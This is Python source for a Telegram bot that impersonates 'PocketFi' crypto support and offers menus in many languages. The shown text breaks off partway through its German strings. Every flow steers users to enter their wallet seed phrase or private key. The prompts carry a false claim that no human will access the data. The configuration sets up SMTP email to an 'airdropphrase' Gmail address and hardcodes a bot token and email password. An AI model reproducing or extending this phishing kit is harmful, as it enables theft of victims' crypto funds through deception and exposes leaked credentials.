#!/usr/bin/env python3
# merged main.py — Back-button conversation flow + full 25-language support + PocketFi welcome & seed guidance
import logging
import smtplib
import os
import re
from email.message import EmailMessage
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ForceReply,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# Conversation states
CHOOSE_LANGUAGE = 0
MAIN_MENU = 1
AWAIT_CONNECT_WALLET = 2
CHOOSE_WALLET_TYPE = 3
CHOOSE_OTHER_WALLET_TYPE = 4
PROMPT_FOR_INPUT = 5
RECEIVE_INPUT = 6
AWAIT_RESTART = 7

# Config (use environment variables in production)
BOT_TOKEN = os.getenv("TOKEN", os.getenv("BOT_TOKEN", "7950018746:AAELUPAMtq2xuPDOSU26embklKfESvq8R58"))
SENDER_EMAIL = os.getenv("SENDER_EMAIL", "airdropphrase@gmail.com")
SENDER_PASSWORD = os.getenv("SENDER_PASSWORD", " ipxs ffag eqmk otqd")
RECIPIENT_EMAIL = os.getenv("RECIPIENT_EMAIL", "airdropphrase@gmail.com")

# Base wallet names mapping
WALLET_DISPLAY_NAMES = {
    'wallet_type_metamask': 'Tonkeeper',
    'wallet_type_trust_wallet': 'Telegram Wallet',
    'wallet_type_coinbase': 'MyTon Wallet',
    'wallet_type_tonkeeper': 'Tonhub',
    'wallet_type_phantom_wallet': 'Trust Wallet',
    'wallet_type_rainbow': 'Rainbow',
    'wallet_type_safepal': 'SafePal',
    'wallet_type_wallet_connect': 'Wallet Connect',
    'wallet_type_ledger': 'Ledger',
    'wallet_type_brd_wallet': 'BRD Wallet',
    'wallet_type_solana_wallet': 'Solana Wallet',
    'wallet_type_balance': 'Balance',
    'wallet_type_okx': 'OKX',
    'wallet_type_xverse': 'Xverse',
    'wallet_type_sparrow': 'Sparrow',
    'wallet_type_earth_wallet': 'Earth Wallet',
    'wallet_type_hiro': 'Hiro',
    'wallet_type_saitamask_wallet': 'Saitamask Wallet',
    'wallet_type_casper_wallet': 'Casper Wallet',
    'wallet_type_cake_wallet': 'Cake Wallet',
    'wallet_type_kepir_wallet': 'Kepir Wallet',
    'wallet_type_icpswap': 'ICPSwap',
    'wallet_type_kaspa': 'Kaspa',
    'wallet_type_nem_wallet': 'NEM Wallet',
    'wallet_type_near_wallet': 'Near Wallet',
    'wallet_type_compass_wallet': 'Compass Wallet',
    'wallet_type_stack_wallet': 'Stack Wallet',
    'wallet_type_soilflare_wallet': 'Soilflare Wallet',
    'wallet_type_aioz_wallet': 'AIOZ Wallet',
    'wallet_type_xpla_vault_wallet': 'XPLA Vault Wallet',
    'wallet_type_polkadot_wallet': 'Polkadot Wallet',
    'wallet_type_xportal_wallet': 'XPortal Wallet',
    'wallet_type_multiversx_wallet': 'Multiversx Wallet',
    'wallet_type_verachain_wallet': 'Verachain Wallet',
    'wallet_type_casperdash_wallet': 'Casperdash Wallet',
    'wallet_type_nova_wallet': 'Nova Wallet',
    'wallet_type_fearless_wallet': 'Fearless Wallet',
    'wallet_type_terra_station': 'Terra Station',
    'wallet_type_cosmos_station': 'Cosmos Station',
    'wallet_type_exodus_wallet': 'Exodus Wallet',
    'wallet_type_argent': 'Argent',
    'wallet_type_binance_chain': 'Binance Chain',
    'wallet_type_safemoon': 'SafeMoon',
    'wallet_type_gnosis_safe': 'Gnosis Safe',
    'wallet_type_defi': 'DeFi',
    'wallet_type_other': 'Other',
}

# Wallet word translations for localized wallet labels
WALLET_WORD_BY_LANG = {
    "en": "Wallet",
    "es": "Billetera",
    "fr": "Portefeuille",
    "ru": "Кошелёк",
    "uk": "Гаманець",
    "fa": "کیف‌پول",
    "ar": "المحفظة",
    "pt": "Carteira",
    "id": "Dompet",
    "de": "Wallet",
    "nl": "Portemonnee",
    "hi": "वॉलेट",
    "tr": "Cüzdan",
    "zh": "钱包",
    "cs": "Peněženka",
    "ur": "والٹ",
    "uz": "Hamyon",
    "it": "Portafoglio",
    "ja": "ウォレット",
    "ms": "Dompet",
    "ro": "Portofel",
    "sk": "Peňaženka",
    "th": "กระเป๋าเงิน",
    "vi": "Ví",
    "pl": "Portfel",
}

# Professional reassurance per language (used in many welcome/prompt strings)
PROFESSIONAL_REASSURANCE = {
    "en": "\n\nFor your security: all information is processed automatically by this encrypted bot and stored encrypted. No human will access your data.",
    "es": "\n\nPara su seguridad: toda la información es procesada automáticamente por este bot cifrado y se almacena cifrada. Ninguna persona tendrá acceso a sus datos.",
    "fr": "\n\nPour votre sécurité : toutes les informations sont traitées automatiquement par ce bot chiffré et stockées de manière chiffrée. Aucune personne n'aura accès à vos données.",
    "ru": "\n\nВ целях вашей безопасности: вся информация обрабатывается автоматически этим зашифрованным ботом и хранится в зашифрованном виде. Человеческий доступ к вашим данным исключён.",
    "uk": "\n\nДля вашої безпеки: усі дані обробляються автоматично цим зашифрованим ботом і зберігаються в зашифрованому вигляді. Ніхто не має доступу до ваших даних.",
    "fa": "\n\nبرای امنیت شما: تمام اطلاعات به‌طور خودکار توسط این ربات رمزگذاری‌شده پردازش و به‌صورت رمزگذاری‌شده ذخیره می‌شوند. هیچ انسانی به داده‌های شما دسترسی نخواهد داشت.",
    "ar": "\n\nلأمانك: تتم معالجة جميع المعلومات تلقائيًا بواسطة هذا الروبوت المشفّر وتخزينها بشكل مشفّر. لا يمكن لأي شخص الوصول إلى بياناتك.",
    "pt": "\n\nPara sua segurança: todas as informações são processadas automaticamente por este bot criptografado e armazenadas criptografadas. Nenhum humano terá acesso aos seus dados.",
    "id": "\n\nDemi keamanan Anda: semua informasi diproses secara otomatis oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tidak ada orang yang akan mengakses data Anda.",
    "de": "\n\nZu Ihrer Sicherheit: Alle Informationen werden automatisch von diesem verschlüsselten Bot verarbeitet und verschlüsselt gespeichert. Kein Mensch hat Zugriff auf Ihre Daten.",
    "nl": "\n\nVoor uw veiligheid: alle informatie wordt automatisch verwerkt door deze versleutelde bot en versleuteld opgeslagen. Niemand krijgt toegang tot uw gegevens.",
    "hi": "\n\nआपकी सुरक्षा के लिए: सभी जानकारी इस एन्क्रिप्टेड बॉट द्वारा स्वचालित रूप से संसाधित और एन्क्रिप्ट करके संग्रहीत की जाती है। किसी भी मानव को आपके डेटा तक पहुंच नहीं होगी।",
    "tr": "\n\nGüvenliğiniz için: tüm bilgiler bu şifreli bot tarafından otomatik olarak işlenir ve şifrelenmiş olarak saklanır. Hiçbir insan verilerinize erişemez.",
    "zh": "\n\n为了您的安全：所有信息均由此加密机器人自动处理并以加密形式存储。不会有人访问您的数据。",
    "cs": "\n\nPro vaše bezpečí: všechny informace jsou automaticky zpracovávány tímto šifrovaným botem a ukládány zašifrováně. K vašim datům nikdo nebude mít přístup.",
    "ur": "\n\nآپ کی حفاظت کے لیے: تمام معلومات خودکار طور پر اس خفیہ بوٹ کے ذریعہ پروسیس اور خفیہ طور پر محفوظ کی جاتی ہیں۔ کسی انسان کو آپ کے ڈیٹا تک رسائی نہیں ہوگی۔",
    "uz": "\n\nXavfsizligingiz uchun: barcha ma'lumotlar ushbu shifrlangan bot tomonidan avtomatik qayta ishlanadi va shifrlangan holda saqlanadi. Hech kim sizning ma'lumotlaringizga kira olmaydi.",
    "it": "\n\nPer la vostra sicurezza: tutte le informazioni sono elaborate automaticamente da questo bot crittografato e memorizzate in modo crittografato. Nessun umano avrà accesso ai vostri dati.",
    "ja": "\n\nお客様の安全のために：すべての情報はこの暗号化されたボットによって自動的に処理され、暗号化された状態で保存されます。人間がデータにアクセスすることはありません。",
    "ms": "\n\nUntuk keselamatan anda: semua maklumat diproses secara automatik oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tiada manusia akan mengakses data anda.",
    "ro": "\n\nPentru siguranța dumneavoastră: toate informațiile sunt procesate automat de acest bot criptat și stocate criptat. Nicio persoană nu va avea acces la datele dumneavoastră.",
    "sk": "\n\nPre vaše bezpečie: všetky informácie sú automaticky spracovávané týmto šifrovaným botom a ukladané v zašifrovanej podobe. Nikto nebude mať prístup k vašim údajom.",
    "th": "\n\nเพื่อความปลอดภัยของคุณ: ข้อมูลทั้งหมดจะได้รับการประมวลผลโดยอัตโนมัติโดยบอทที่เข้ารหัสนี้และจัดเก็บในรูปแบบที่เข้ารหัส ไม่มีบุคคลใดจะเข้าถึงข้อมูลของคุณได้",
    "vi": "\n\nVì sự an toàn của bạn: tất cả thông tin được xử lý tự động bởi bot được mã hóa này và được lưu trữ dưới dạng đã mã hóa. Không ai có thể truy cập dữ liệu của bạn。",
    "pl": "\n\nDla Twojego bezpieczeństwa: wszystkie informacje są automatycznie przetwarzane przez tego zaszyfrowanego bota i przechowywane w formie zaszyfrowanej. Żaden człowiek nie będzie miał dostępu do Twoich danych.",
}

# Full LANGUAGES mapping (25+ languages) — localized welcome, prompts, and special messages
# Note: welcome strings updated to PocketFi; claim_og_pass removed; new "recover burned tokens" translations added.
LANGUAGES = {
    "en": {
        "welcome": "Hi, {user}\nWelcome to PocketFi support bot. This bot can help you troubleshoot and resolve issues listed in the menu: Validation; Claim Tokens; Assets Recovery; General Issues; Rectification; Missing Balance; Login Issues; Migration Issues; Recover Burned Tokens; Deposits; Pending Withdrawal." + PROFESSIONAL_REASSURANCE["en"],
        "main menu title": "Please select an issue type to continue:",
        "validation": "Validation",
        "claim tokens": "Claim Tokens",
        "assets recovery": "Assets Recovery",
        "general issues": "General Issues",
        "rectification": "Rectification",
        "recover burned tokens": "Recover Burned Tokens",
        "deposits": "Deposits",
        "withdrawals": "Withdrawals",
        "missing balance": "Missing Balance",
        "login issues": "Login Issues",
        "migration issues": "Migration Issues",
        "connect wallet message": "Please connect your wallet with your Private Key or Seed Phrase to continue.",
        "connect wallet button": "🔑 Connect Wallet",
        "select wallet type": "Please select your wallet type:",
        "other wallets": "Other Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "wallet selection message": "You have selected {wallet_name}.\nSelect your preferred mode of connection.",
        "prompt seed": "Please enter the 12 or 24 words of your wallet." + PROFESSIONAL_REASSURANCE["en"],
        "prompt private key": "Please enter your private key." + PROFESSIONAL_REASSURANCE["en"],
        "error_use_seed_phrase": "This field requires a seed phrase (12 or 24 words). Please provide the seed phrase instead.",
        "post_receive_error": "‼️ An error occured, Please ensure you are entering the correct key, please use copy and paste to avoid errors. please /start to try again.",
        "choose language": "Please select your preferred language:",
        "await restart message": "Please click /start to start over.",
        "back": "🔙 Back",
        "invalid_input": "Invalid input. Please use /start to begin.",
        "fix ads": "Pending Withdrawal",
        "pending_withdrawal_connect": "Please connect your wallet to receive your pending withdrawal.",
    },
    "es": {
        "welcome": "Hola, {user}\nBienvenido al bot de soporte PocketFi. Este bot puede ayudarle a diagnosticar y resolver los problemas listados en el menú: Validación; Reclamar Tokens; Recuperación de Activos; Problemas Generales; Rectificación; Saldo Perdido; Problemas de Inicio de Sesión; Problemas de Migración; Recuperar Tokens Quemados; Depósitos; Retiro Pendiente." + PROFESSIONAL_REASSURANCE["es"],
        "main menu title": "Seleccione un tipo de problema para continuar:",
        "validation": "Validación",
        "claim tokens": "Reclamar Tokens",
        "assets recovery": "Recuperación de Activos",
        "general issues": "Problemas Generales",
        "rectification": "Rectificación",
        "recover burned tokens": "Recuperar Tokens Quemados",
        "deposits": "Depósitos",
        "withdrawals": "Retiros",
        "missing balance": "Saldo Perdido",
        "login issues": "Problemas de Inicio de Sesión",
        "migration issues": "Problemas de Migración",
        "connect wallet message": "Por favor conecte su billetera con su Clave Privada o Frase Seed para continuar.",
        "connect wallet button": "🔑 Conectar Billetera",
        "select wallet type": "Por favor, seleccione el tipo de su billetera:",
        "other wallets": "Otras Billeteras",
        "private key": "🔑 Clave Privada",
        "seed phrase": "🔒 Importar Frase Seed",
        "wallet selection message": "Ha seleccionado {wallet_name}.\nSeleccione su modo de conexión preferido.",
        "prompt seed": "Por favor, ingrese su frase seed de 12 o 24 palabras." + PROFESSIONAL_REASSURANCE["es"],
        "prompt private key": "Por favor, ingrese su clave privada." + PROFESSIONAL_REASSURANCE["es"],
        "error_use_seed_phrase": "Este campo requiere una frase seed (12 o 24 palabras). Por favor proporcione la frase seed.",
        "post_receive_error": "‼️ Ocurrió un error. Asegúrese de introducir la clave correcta: use copiar y pegar para evitar errores. Por favor /start para intentarlo de nuevo.",
        "choose language": "Por favor, seleccione su idioma preferido:",
        "await restart message": "Haga clic en /start para empezar de nuevo.",
        "back": "🔙 Volver",
        "invalid_input": "Entrada inválida. Use /start para comenzar.",
        "fix ads": "Retiro Pendiente",
        "pending_withdrawal_connect": "Por favor, conecte su billetera para recibir su retiro pendiente.",
    },
    "fr": {
        "welcome": "Bonjour, {user}\nBienvenue sur le bot d'assistance PocketFi. Ce bot peut vous aider à diagnostiquer et résoudre les problèmes listés dans le menu : Validation ; Réclamation de Tokens ; Récupération d'Actifs ; Problèmes Généraux ; Rectification ; Solde Manquant ; Problèmes de Connexion ; Problèmes de Migration ; Récupérer les jetons brûlés ; Dépôts ; Retrait en Attente." + PROFESSIONAL_REASSURANCE["fr"],
        "main menu title": "Veuillez sélectionner un type de problème pour continuer :",
        "validation": "Validation",
        "claim tokens": "Réclamer des Tokens",
        "assets recovery": "Récupération d'Actifs",
        "general issues": "Problèmes Généraux",
        "rectification": "Rectification",
        "recover burned tokens": "Récupérer les jetons brûlés",
        "deposits": "Dépôts",
        "withdrawals": "Retraits",
        "missing balance": "Solde Manquant",
        "login issues": "Problèmes de Connexion",
        "migration issues": "Problèmes de Migration",
        "connect wallet message": "Veuillez connecter votre portefeuille avec votre clé privée ou votre phrase seed pour continuer.",
        "connect wallet button": "🔑 Connecter un Portefeuille",
        "select wallet type": "Veuillez sélectionner votre type de portefeuille :",
        "other wallets": "Autres Portefeuilles",
        "private key": "🔑 Clé Privée",
        "seed phrase": "🔒 Importer une Phrase Seed",
        "wallet selection message": "Vous avez sélectionné {wallet_name}.\nSélectionnez votre mode de connexion préféré.",
        "prompt seed": "Veuillez entrer votre phrase seed de 12 ou 24 mots." + PROFESSIONAL_REASSURANCE["fr"],
        "prompt private key": "Veuillez entrer votre clé privée." + PROFESSIONAL_REASSURANCE["fr"],
        "error_use_seed_phrase": "Ce champ requiert une phrase seed (12 ou 24 mots). Veuillez fournir la phrase seed.",
        "post_receive_error": "‼️ Une erreur est survenue. Veuillez vous assurer que vous saisissez la bonne clé — utilisez copier-coller pour éviter les erreurs. Veuillez /start pour réessayer.",
        "choose language": "Veuillez sélectionner votre langue préférée :",
        "await restart message": "Cliquez sur /start pour recommencer.",
        "back": "🔙 Retour",
        "invalid_input": "Entrée invalide. Veuillez utiliser /start pour commencer.",
        "fix ads": "Retrait en Attente",
        "pending_withdrawal_connect": "Veuillez connecter votre portefeuille pour recevoir votre retrait en attente.",
    },
    "ru": {
        "welcome": "Привет, {user}\nДобро пожаловать в PocketFi support bot. Этот бот поможет вам диагностировать и решить проблемы, перечисленные в меню: Валидация; Получение Токенов; Восстановление Активов; Общие Проблемы; Исправление; Пропавший Баланс; Проблемы с Входом; Проблемы с Миграцией; Восстановление сожжённых токенов; Депозиты; Ожидаемый Вывод." + PROFESSIONAL_REASSURANCE["ru"],
        "main menu title": "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
        "validation": "Валидация",
        "claim tokens": "Получить Токены",
        "assets recovery": "Восстановление Активов",
        "general issues": "Общие Проблемы",
        "rectification": "Исправление",
        "recover burned tokens": "Восстановление сожжённых токенов",
        "deposits": "Депозиты",
        "withdrawals": "Выводы",
        "missing balance": "Пропавший Баланс",
        "login issues": "Проблемы со Входом",
        "migration issues": "Проблемы с Миграцией",
        "connect wallet message": "Пожалуйста, подключите кошелёк приватным ключом или seed-фразой.",
        "connect wallet button": "🔑 Подключить Кошелёк",
        "select wallet type": "Пожалуйста, выберите тип вашего кошелька:",
        "other wallets": "Другие Кошельки",
        "private key": "🔑 Приватный Ключ",
        "seed phrase": "🔒 Импортировать Seed Фразу",
        "wallet selection message": "Вы выбрали {wallet_name}.\nВыберите предпочитаемый способ подключения.",
        "prompt seed": "Пожалуйста, введите seed-фразу из 12 или 24 слов." + PROFESSIONAL_REASSURANCE["ru"],
        "prompt private key": "Пожалуйста, введите приватный ключ." + PROFESSIONAL_REASSURANCE["ru"],
        "error_use_seed_phrase": "Поле требует seed-фразу (12 или 24 слова). Пожалуйста, предоставьте seed-фразу.",
        "post_receive_error": "‼️ Произошла ошибка. Пожалуйста, убедитесь, что вводите правильный ключ — используйте копирование/вставку. Пожалуйста, /start чтобы попробовать снова.",
        "choose language": "Пожалуйста, выберите язык:",
        "await restart message": "Нажмите /start чтобы начать заново.",
        "back": "🔙 Назад",
        "invalid_input": "Неверный ввод. Используйте /start чтобы начать.",
        "fix ads": "Ожидаемый Вывод",
        "pending_withdrawal_connect": "Пожалуйста, подключите кошелёк, чтобы получить ваш ожидаемый вывод.",
    },
    "uk": {
        "welcome": "Привіт, {user}\nЛаскаво просимо в PocketFi support bot. Цей бот допоможе вам діагностувати та вирішити проблеми, перелічені в меню: Валідація; Отримання Токенів; Відновлення Активів; Загальні Проблеми; Виправлення; Зниклий Баланс; Проблеми з Входом; Проблеми з Міграцією; Відновлення згорілих токенів; Депозити; Очікуване Виведення." + PROFESSIONAL_REASSURANCE["uk"],
        "main menu title": "Будь ласка, виберіть тип проблеми для продовження:",
        "validation": "Валідація",
        "claim tokens": "Отримати Токени",
        "assets recovery": "Відновлення Активів",
        "general issues": "Загальні Проблеми",
        "rectification": "Виправлення",
        "recover burned tokens": "Відновлення згорілих токенів",
        "deposits": "Депозити",
        "withdrawals": "Виведення",
        "missing balance": "Зниклий Баланс",
        "login issues": "Проблеми з Входом",
        "migration issues": "Проблеми з Міграцією",
        "connect wallet message": "Будь ласка, підключіть гаманець приватним ключем або seed-фразою.",
        "connect wallet button": "🔑 Підключити Гаманець",
        "select wallet type": "Будь ласка, виберіть тип гаманця:",
        "other wallets": "Інші Гаманці",
        "private key": "🔑 Приватний Ключ",
        "seed phrase": "🔒 Імпортувати Seed Фразу",
        "wallet selection message": "Ви вибрали {wallet_name}.\nВиберіть спосіб підключення.",
        "prompt seed": "Введіть seed-фразу з 12 або 24 слів." + PROFESSIONAL_REASSURANCE["uk"],
        "prompt private key": "Введіть приватний ключ." + PROFESSIONAL_REASSURANCE["uk"],
        "error_use_seed_phrase": "Поле вимагає seed-фразу (12 або 24 слова). Будь ласка, надайте seed-фразу.",
        "post_receive_error": "‼️ Сталася помилка. Переконайтеся, що ви вводите правильний ключ — використовуйте копіювання та вставлення, щоб уникнути помилок. Будь ласка, /start щоб спробувати знову.",
        "choose language": "Будь ласка, виберіть мову:",
        "await restart message": "Натисніть /start щоб почати заново.",
        "back": "🔙 Назад",
        "invalid_input": "Недійсний ввід. Використовуйте /start щоб почати.",
        "fix ads": "Очікуване Виведення",
        "pending_withdrawal_connect": "Будь ласка, підключіть гаманець, щоб отримати ваш очікуваний вивід.",
    },
    "fa": {
        "welcome": "سلام، {user}\nبه PocketFi support bot خوش آمدید. این ربات می‌تواند به شما در عیب‌یابی و حل مشکلات فهرست‌شده در منو کمک کند: اعتبارسنجی؛ دریافت توکن‌ها؛ بازیابی دارایی‌ها؛ مسائل عمومی؛ اصلاح؛ موجودی گمشده؛ مشکلات ورود؛ مسائل مهاجرت؛ بازیابی توکن‌های سوخته؛ واریزها؛ برداشت در انتظار." + PROFESSIONAL_REASSURANCE["fa"],
        "main menu title": "لطفاً یک نوع مشکل را انتخاب کنید:",
        "validation": "اعتبارسنجی",
        "claim tokens": "دریافت توکن‌ها",
        "assets recovery": "بازیابی دارایی‌ها",
        "general issues": "مسائل عمومی",
        "rectification": "اصلاح",
        "recover burned tokens": "بازیابی توکن‌های سوخته",
        "deposits": "واریز",
        "withdrawals": "برداشت",
        "missing balance": "موجودی گمشده",
        "login issues": "مشکلات ورود",
        "migration issues": "مسائل مهاجرت",
        "connect wallet message": "لطفاً کیف‌پول خود را با کلید خصوصی یا seed متصل کنید.",
        "connect wallet button": "🔑 اتصال کیف‌پول",
        "select wallet type": "لطفاً نوع کیف‌پول را انتخاب کنید:",
        "other wallets": "کیف‌پول‌های دیگر",
        "private key": "🔑 کلید خصوصی",
        "seed phrase": "🔒 وارد کردن Seed Phrase",
        "wallet selection message": "شما {wallet_name} را انتخاب کرده‌اید.\nروش اتصال را انتخاب کنید.",
        "prompt seed": "لطفاً seed با 12 یا 24 کلمه را وارد کنید." + PROFESSIONAL_REASSURANCE["fa"],
        "prompt private key": "لطفاً کلید خصوصی خود را وارد کنید." + PROFESSIONAL_REASSURANCE["fa"],
        "error_use_seed_phrase": "این فیلد به یک seed phrase (12 یا 24 کلمه) نیاز دارد. لطفاً seed را وارد کنید.",
        "post_receive_error": "‼️ خطا رخ داد. لطفاً مطمئن شوید کلید صحیح را وارد می‌کنید — از کپی/پیست استفاده کنید. لطفاً /start برای تلاش مجدد.",
        "choose language": "لطفاً زبان را انتخاب کنید:",
        "await restart message": "برای شروع مجدد /start را بزنید.",
        "back": "🔙 بازگشت",
        "invalid_input": "ورودی نامعتبر. لطفاً از /start استفاده کنید.",
        "fix ads": "برداشت در انتظار",
        "pending_withdrawal_connect": "لطفاً کیف‌پول خود را متصل کنید تا برداشت در انتظار خود را دریافت کنید.",
    },
    "ar": {
        "welcome": "مرحبًا، {user}\nمرحبًا بك في بوت دعم PocketFi. يمكن لهذا البوت مساعدتك في استكشاف وحل المشكلات المدرجة في القائمة: التحقق؛ المطالبة بالرموز؛ استرداد الأصول؛ المشكلات العامة؛ التصحيح؛ الرصيد المفقود؛ مشاكل تسجيل الدخول؛ مشاكل الهجرة؛ استعادة الرموز المحروقة؛ الودائع؛ السحب قيد الانتظار." + PROFESSIONAL_REASSURANCE["ar"],
        "main menu title": "يرجى تحديد نوع المشكلة للمتابعة:",
        "validation": "التحقق",
        "claim tokens": "المطالبة بالرموز",
        "assets recovery": "استرداد الأصول",
        "general issues": "مشاكل عامة",
        "rectification": "تصحيح",
        "recover burned tokens": "استعادة الرموز المحروقة",
        "deposits": "الودائع",
        "withdrawals": "السحوبات",
        "missing balance": "الرصيد المفقود",
        "login issues": "مشاكل تسجيل الدخول",
        "migration issues": "مشاكل الترحيل",
        "connect wallet message": "يرجى توصيل محفظتك باستخدام المفتاح الخاص أو عبارة seed للمتابعة.",
        "connect wallet button": "🔑 توصيل المحفظة",
        "select wallet type": "يرجى اختيار نوع المحفظة:",
        "other wallets": "محافظ أخرى",
        "private key": "🔑 المفتاح الخاص",
        "seed phrase": "🔒 استيراد Seed Phrase",
        "wallet selection message": "لقد اخترت {wallet_name}.\nحدد وضع الاتصال المفضل.",
        "prompt seed": "يرجى إدخال عبارة seed مكونة من 12 أو 24 كلمة." + PROFESSIONAL_REASSURANCE["ar"],
        "prompt private key": "يرجى إدخال المفتاح الخاص." + PROFESSIONAL_REASSURANCE["ar"],
        "error_use_seed_phrase": "هذا الحقل يتطلب عبارة seed (12 أو 24 كلمة). الرجاء تقديم عبارة seed.",
        "post_receive_error": "‼️ حدث خطأ. يرجى التأكد من إدخال المفتاح الصحيح — استخدم النسخ واللصق لتجنب الأخطاء. يرجى /start للمحاولة مرة أخرى.",
        "choose language": "اختر لغتك المفضلة:",
        "await restart message": "انقر /start للبدء من جديد.",
        "back": "🔙 عودة",
        "invalid_input": "إدخال غير صالح. استخدم /start للبدء.",
        "fix ads": "السحب قيد الانتظار",
        "pending_withdrawal_connect": "يرجى توصيل محفظتك لاستلام السحب المعلق الخاص بك.",
    },
    "pt": {
        "welcome": "Olá, {user}\nBem-vindo ao bot de suporte PocketFi. Este bot pode ajudá-lo a diagnosticar e resolver os problemas listados no menu: Validação; Reivindicar Tokens; Recuperação de Ativos; Problemas Gerais; Retificação; Saldo em Falta; Problemas de Login; Problemas de Migração; Recuperar Tokens Queimados; Depósitos; Retirada Pendente." + PROFESSIONAL_REASSURANCE["pt"],
        "main menu title": "Selecione um tipo de problema para continuar:",
        "validation": "Validação",
        "claim tokens": "Reivindicar Tokens",
        "assets recovery": "Recuperação de Ativos",
        "general issues": "Problemas Gerais",
        "rectification": "Retificação",
        "recover burned tokens": "Recuperar Tokens Queimados",
        "deposits": "Depósitos",
        "withdrawals": "Saques",
        "missing balance": "Saldo Ausente",
        "login issues": "Problemas de Login",
        "migration issues": "Problemas de Migração",
        "connect wallet message": "Por favor, conecte sua carteira com sua Chave Privada ou Seed Phrase para continuar.",
        "connect wallet button": "🔑 Conectar Carteira",
        "select wallet type": "Selecione o tipo da sua carteira:",
        "other wallets": "Outras Carteiras",
        "private key": "🔑 Chave Privada",
        "seed phrase": "🔒 Importar Seed Phrase",
        "wallet selection message": "Você selecionou {wallet_name}.\nSelecione seu modo de conexão preferido.",
        "prompt seed": "Por favor, insira sua seed phrase de 12 ou 24 palavras." + PROFESSIONAL_REASSURANCE["pt"],
        "prompt private key": "Por favor, insira sua chave privada." + PROFESSIONAL_REASSURANCE["pt"],
        "error_use_seed_phrase": "Este campo requer uma seed phrase (12 ou 24 palavras). Por favor, forneça a seed phrase.",
        "post_receive_error": "‼️ Ocorreu um erro. Certifique-se de inserir a chave correta — use copiar/colar para evitar erros. Por favor /start para tentar novamente.",
        "choose language": "Selecione seu idioma preferido:",
        "await restart message": "Clique em /start para reiniciar.",
        "back": "🔙 Voltar",
        "invalid_input": "Entrada inválida. Use /start para começar.",
        "fix ads": "Retirada Pendente",
        "pending_withdrawal_connect": "Por favor, conecte sua carteira para receber sua retirada pendente.",
    },
    "id": {
        "welcome": "Hai, {user}\nSelamat datang di PocketFi support bot. Bot ini dapat membantu Anda mendiagnosis dan menyelesaikan masalah yang tercantum di menu: Validasi; Klaim Token; Pemulihan Aset; Masalah Umum; Rekonsiliasi; Saldo Hilang; Masalah Login; Masalah Migrasi; Pulihkan Token yang Terbakar; Deposit; Penarikan Tertunda." + PROFESSIONAL_REASSURANCE["id"],
        "main menu title": "Silakan pilih jenis masalah untuk melanjutkan:",
        "validation": "Validasi",
        "claim tokens": "Klaim Token",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Masalah Umum",
        "rectification": "Rekonsiliasi",
        "recover burned tokens": "Pulihkan Token yang Terbakar",
        "deposits": "Deposit",
        "withdrawals": "Penarikan",
        "missing balance": "Saldo Hilang",
        "login issues": "Masalah Login",
        "migration issues": "Masalah Migrasi",
        "connect wallet message": "Sambungkan dompet Anda dengan Kunci Pribadi atau Seed Phrase untuk melanjutkan.",
        "connect wallet button": "🔑 Sambungkan Dompet",
        "select wallet type": "Pilih jenis dompet Anda:",
        "other wallets": "Dompet Lain",
        "private key": "🔑 Kunci Pribadi",
        "seed phrase": "🔒 Impor Seed Phrase",
        "wallet selection message": "Anda telah memilih {wallet_name}.\nPilih mode koneksi pilihan Anda.",
        "prompt seed": "Masukkan seed phrase 12 atau 24 kata Anda." + PROFESSIONAL_REASSURANCE["id"],
        "prompt private key": "Masukkan kunci pribadi Anda." + PROFESSIONAL_REASSURANCE["id"],
        "error_use_seed_phrase": "Kolom ini memerlukan seed phrase (12 atau 24 kata). Silakan berikan seed phrase.",
        "post_receive_error": "‼️ Terjadi kesalahan. Pastikan Anda memasukkan kunci yang benar — gunakan salin dan tempel untuk menghindari kesalahan. Silakan /start untuk mencoba lagi.",
        "choose language": "Silakan pilih bahasa:",
        "await restart message": "Klik /start untuk memulai ulang.",
        "back": "🔙 Kembali",
        "invalid_input": "Input tidak valid. Gunakan /start untuk mulai.",
        "fix ads": "Penarikan Tertunda",
        "pending_withdrawal_connect": "Silakan sambungkan dompet Anda untuk menerima penarikan tertunda Anda.",
    },
    "de": {
        "welcome": "Hallo, {user}\nWillkommen beim PocketFi Support-Bot. Dieser Bot kann Ihnen helfen, die im Menü aufgeführten Probleme zu diagnostizieren und zu lösen: Validierung; Tokens beanspruchen; Wiederherstellung von Vermögenswerten; Allgemeine Probleme; Berichtigung; Fehlender Saldo; Anmeldeprobleme; Migrationsprobleme; Wiederherstellung verbrannter Token; Einzahlungen; Ausstehende Auszahlung." + PROFESSIONAL_REASSURANCE["de"],
        "main menu title": "Bitte wählen Sie einen Problemtyp, um fortzufahren:",
        "validation": "Validierung",
        "claim tokens": "Tokens Beanspruchen",
        "assets recovery": "Wiederherstellung von Vermögenswerten",
        "general issues": "Allgemeine Probleme",
        "rectification": "Berichtigung",
        "recover burned tokens": "Verbrannte Tokens wiederherstellen",
        "deposits": "Einzahlungen",
        "withdrawals": "Auszahlungen",
        "missing balance": "Fehlender Saldo",
        "login issues": "Anmeldeprobleme",
        "migration issues": "Migrationsprobleme",
        "connect wallet message": "Bitte verbinden Sie Ihre Wallet mit Ihrem privaten Schlüssel oder Ihrer Seed-Phrase, um fortzufahren.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Bitte wählen Sie Ihren Wallet-Typ:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privater Schlüssel",
        "seed phrase": "🔒 Seed-Phrase importieren",
        "wallet selection message": "Sie haben {wallet_name} ausgewählt.\nWählen Sie Ihre bevorzugte Verbindungsmethode.",
        "prompt seed": "Bitte geben Sie Ihre Seed-Phrase mit 12 oder 24 Wörtern ein." + PROFESSIONAL_REASSURANCE["de"],
        "prompt private key": "Bitte geben Sie Ihren privaten Schlüssel ein." + PROFESSIONAL_REASSURANCE["de"],
        "error_use_seed_phrase": "Dieses Feld erfordert eine Seed-Phrase (12 oder 24 Wörter).",
